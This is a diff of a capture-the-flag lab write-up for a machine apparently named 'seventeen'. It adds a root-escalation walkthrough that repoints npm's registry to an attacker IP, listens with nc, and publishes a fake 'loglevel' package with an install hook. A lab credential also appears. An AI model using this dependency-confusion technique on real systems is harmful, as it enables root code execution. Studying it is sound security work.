@@ -549,22 +549,68 @@ kavi IhateMathematics123#
 
 ## Rooting
 
-The local NodeJS imports packages from a custom Verdaccio registry:
+As user `kavi`:
+
+```shell
+sudo -l
+# User kavi may run the following commands on seventeen:
+#     (ALL) /opt/app/startup.sh
+ls -lah /opt/app/
+# -rwxr-xr-x  1 root root  158 Mar 13 17:26 index.html
+# -rwxr-xr-x  1 root root  781 Mar 15 19:58 index.js
+# drwxr-xr-x 14 root root 4.0K May 10 17:45 node_modules
+# -rwxr-xr-x  1 root root  465 May 29 14:01 startup.sh
+cat /opt/app.startup.sh
+# deps=('db-logger' 'loglevel')
+# for dep in ${deps[@]}; do
+#     /bin/echo "[=] Checking for $dep"
+#     o=$(/usr/bin/npm -l ls|/bin/grep $dep)
+
+#     if [[ "$o" != *"$dep"* ]]; then
+#         /bin/echo "[+] Installing $dep"
+#         /usr/bin/npm install $dep --silent
+#         /bin/chown root:root node_modules -R
+#     else
+#         /bin/echo "[+] $dep already installed"
+
+#     fi
+# done
+```
+
+This is a NodeJS app, whose install script can run as root.
+
+### Installing the app
+
+The startup script will install all dependencies and start the app.
+
+The actual files land in `~/.npm`:
+
+```shell
+sudo /opt/app/startup.sh
+ls -lah .npm
+# drwxr-xr-x 4 kavi kavi 4.0K Jun 14 18:54 127.0.0.1_4873
+# drwxr-xr-x 2 kavi kavi 4.0K Jun 14 18:54 _locks
+# drwxr-xr-x 3 kavi kavi 4.0K Jun 14 18:54 loglevel
+# drwxr-xr-x 3 kavi kavi 4.0K Jun 14 18:54 mysql
+```
+
+### Dependency confusion attack
+
+Looking at `~/.npm` made me notice:
 
 ```shell
 cat /home/kavi/.npmrc
 # registry=http://127.0.0.1:4873/
 ```
 
-So the local app at `/opt/app` will install dependencies from this registry:
+So the local app at `/opt/app` will install dependencies from a local registry:
 
 ```shell
-ls -lah /opt/app/
-# -rwxr-xr-x  1 root root  158 Mar 13 17:26 index.html
-# -rwxr-xr-x  1 root root  781 Mar 15 19:58 index.js
-# drwxr-xr-x 14 root root 4.0K May 10 17:45 node_modules
-# -rwxr-xr-x  1 root root  465 May 29 14:01 startup.sh
-cat /opt/app/index.js
+grep -ai require /opt/app/index.js
+# const http = require('http')
+# const fs = require('fs')
+# //var logger = require('db-logger')
+# var logger = require('loglevel')
 ```
 
 Now we can point NPM to our own server and host a malicious version of `loglevel` with:
@@ -573,6 +619,88 @@ Now we can point NPM to our own server and host a malicious version of `loglevel
 echo 'registry=http://10.10.16.5:4873/' > /home/kavi/.npmrc
 ```
 
+Listen on our side and run the app with:
+
+```shell
+# attacker
+nc -lvn 10.10.16.5 4873
+# target
+sudo /opt/app/startup.sh
+```
+
+It works!
+
+```
+Ncat: Connection from 10.10.11.165.
+Ncat: Connection from 10.10.11.165:49504.
+GET /loglevel HTTP/1.1
+accept-encoding: gzip
+version: 3.5.2
+accept: application/json
+referer: install loglevel
+npm-session: 42f835f5666b8b4d
+user-agent: npm/3.5.2 node/v8.10.0 linux x64
+host: 10.10.16.5:4873
+Connection: keep-alive
+```
+
+```
+[+] Installing loglevel
+▌ ╢░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
+```
+
+This is called a ["dependency confusion attack"][snyk-dca]. 
+
+### Creating a private registry
+
+This is well documented and most easy with Docker:
+
+```shell
+docker pull verdaccio/verdaccio
+docker run -it --rm --name verdaccio -p 4873:4873 verdaccio/verdaccio
+```
+
+### Hosting a malicious package
+
+Now we create a fake package "loglevel" with `npm init`:
+
+```json
+{
+  "name": "loglevel",
+  "version": "13.37.0",
+  "description": "dca",
+  "main": "index.js",
+  "scripts": {
+    "install": "touch /tmp/pwney",
+    "test": "touch /tmp/pwney"
+  },
+  "author": "apehex",
+  "license": "ISC"
+}
+```
+
+Make sure the version is high enough to justify an update.
+
+This first version is for testing purpose: this simple `touch` hook will ensure that the server is reachable and that hooks are actually triggered.
+
+Next we publish it:
+
+```shell
+sudo npm adduser --registry http://localhost:4873
+npm login --registry http://localhost:4873
+npm publish  --registry http://localhost:4873
+```
+
+And on the target machine:
+
+```shell
+sudo /opt/app/startup.sh
+```
+
+But it hangs, and my local registry tries to download "loglevel" from an official registry...
+
+May-be the package is somehow broken / incomplete. Let's download the officiel "loglevel" and tamper it afterwards. The startup script installs it in `.npm`, so just SCP it out of the box.
+
 [author-profile]: https://app.hackthebox.com/users/389926
 [erms-repo]: https://www.sourcecodester.com/php/15160/simple-exam-reviewer-management-system-phpoop-free-source-code.html
 [frontpage]: images/frontpage.png
@@ -580,4 +708,5 @@ echo 'registry=http://10.10.16.5:4873/' > /home/kavi/.npmrc
 [oretnom23]: https://www.google.com/search?q=oretnom23+exam+php
 [sfms-admin-login]: images/sfms-admin-login.png
 [sfms-sqli]: https://www.exploit-db.com/exploits/48437
+[snyk-dca]: https://snyk.io/blog/detect-prevent-dependency-confusion-attacks-npm-supply-chain-security/
 [student-portal]: images/student-portal.png
